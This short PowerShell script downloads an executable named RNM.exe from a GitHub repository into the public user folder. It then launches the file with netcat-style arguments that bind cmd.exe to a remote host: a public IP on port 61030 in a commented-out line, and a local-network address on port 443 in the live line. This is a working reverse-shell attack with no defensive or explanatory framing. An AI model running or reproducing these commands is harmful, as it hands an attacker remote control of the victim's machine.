#Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/RNM.exe -OutFile C:\Users\Public\RNM.exe
#Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 61030 -e cmd.exe"
Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 192.168.1.2 443 -e cmd.exe"

